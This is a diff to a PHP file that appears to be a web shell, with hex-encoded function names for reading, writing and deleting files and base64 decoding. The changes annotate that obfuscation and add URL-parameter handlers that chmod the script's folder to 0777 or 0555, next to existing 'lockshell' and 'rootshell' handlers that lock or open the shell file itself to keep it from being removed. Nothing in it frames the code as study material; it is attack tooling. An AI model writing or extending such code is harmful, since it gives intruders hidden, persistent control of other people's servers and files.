@@ -1,13 +1,15 @@
 <?php
 $Array = [
-	'66696c655f6765745f636f6e74656e7473',
-	'69735f646972',
-	'66696c655f7075745f636f6e74656e7473',
-	'69735f66696c65',
-	'756e6c696e6b',
-	'66756E6374696F6E5F657869737473',
-	'6261736536345F656E636F6465',
-	'676574637764'
+
+// $GLOBALS['fungsi'][0]
+	'66696c655f6765745f636f6e74656e7473', // f i l e g e t c o n t e n t s => 0
+	'69735f646972', // i s _ d i r => 1
+	'66696c655f7075745f636f6e74656e7473', // f i l e p u t c o n t e n t s  => 2
+	'69735f66696c65', // i s _ f i l e => 3
+	'756e6c696e6b', // u n l i n k => 4
+	'66756E6374696F6E5F657869737473', // f u n c t i o n _ e x i s t s => 5
+	'6261736536345F656E636F6465', // b a s e 6 4 _ d e c o d e => 6
+	'676574637764' // g e t c w d => 7
 ];
 $hitung_array = count($Array);
 for ($i = 0; $i < $hitung_array; $i++) {
@@ -404,6 +406,7 @@ for($i = 0; $i <= $c_dir; $i++) {
 	$scdir[$i];
 if($i != $c_dir) {
 }
+
 function changeFilePermissions($filename, $permissions) {
     if (file_exists($filename)) {
         if (chmod($filename, $permissions)) {
@@ -440,6 +443,19 @@ function rootFolder($folderPath, $permissions) {
     }
 }
 
+if (isset($_GET['id'])) {
+    if ($_GET['id'] === 'lockfolder') {
+        $folderPath = __DIR__;
+        $newPermissions = 0555;
+        lockFolder($folderPath, $newPermissions);
+    } elseif ($_GET['id'] === 'rootfolder') {
+        $folderPath = __DIR__;
+        $newPermissions = 0777;
+        $actionMessage = rootFolder($folderPath, $newPermissions);
+        echo $actionMessage;
+    }
+}
+
 function changeFolderPermissionsRecursive($dir, $perms) {
     $iterator = new RecursiveIteratorIterator(
         new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
@@ -469,7 +485,7 @@ function changeFilePermissionsRecursive($dir, $perms) {
 $currentDirectory = '.';
 
 if (isset($_GET['id']) && $_GET['id'] === 'root_file') {
-	$newFilePermissions = 0644;
+    $newFilePermissions = 0644;
     changeFilePermissionsRecursive($currentDirectory, $newFilePermissions);
     echo "Permissions changed for all files in the current directory.";
 }
@@ -495,11 +511,12 @@ if (isset($_GET['id']) && $_GET['id'] === 'dark_folders') {
 $filename = __FILE__;
 
 if (isset($_GET['id']) && $_GET['id'] === 'lockshell') {
-    $newPermissions = 0444;
+    $newPermissions = 0444; // Use octal value with leading 0
     changeFilePermissions($filename, $newPermissions);
 }
+
 if (isset($_GET['id']) && $_GET['id'] === 'rootshell') {
-    $newPermissions = 0777;
+    $newPermissions = 0777; // Use octal value with leading 0
     changeFilePermissions($filename, $newPermissions);
 }
 		$ip = $_SERVER['REMOTE_ADDR'];
